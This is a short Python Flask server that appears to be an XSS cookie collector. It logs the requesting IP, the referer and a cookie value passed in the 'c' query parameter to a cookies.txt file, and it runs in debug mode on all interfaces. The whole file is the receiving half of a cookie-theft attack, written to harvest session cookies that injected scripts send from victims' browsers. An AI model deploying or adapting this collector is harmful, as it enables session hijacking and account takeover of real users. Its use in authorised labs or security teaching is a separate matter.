from flask import Flask, request

app = Flask(__name__)


@app.route('/')

def index():

	ip = request.remote_addr
	referer = str(request.referrer)
	cookie = str(request.args.get('c'))

	print(ip)
	print(cookie)
	print(referer)


	f = open('./log/cookies.txt', 'a+')
	f.write('ip: ' + ip + '\n')	
	f.write('referer: ' + referer + '\n')
	f.write('cookie: ' + cookie + '\n\n')
	f.close()

	return ""

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=3000, threaded=True, debug=True)
